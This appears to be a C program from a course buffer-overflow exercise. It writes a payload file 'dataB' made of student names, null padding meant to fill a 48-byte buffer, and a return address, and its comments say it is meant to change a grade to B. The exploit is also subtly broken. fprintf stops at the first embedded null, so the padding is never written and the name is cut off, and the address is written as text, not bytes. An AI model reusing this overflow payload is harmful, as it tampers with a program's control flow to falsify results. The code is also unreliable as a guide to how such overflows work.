#include <stdio.h>

int main(void)
{
    FILE *psFile;
    psFile = fopen("dataB", "w");

    /* 25 characters */
    fprintf(psFile, "Ben Zhou and Owen Clarke'\0'");

    /* 23 more charcters to fill up 48 bytes of buffer */
    fprintf(psFile, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");

    /* Return address for changing grade to B */
    fprintf(psFile, "0x400894");

    fclose(psFile);

    return 0;
}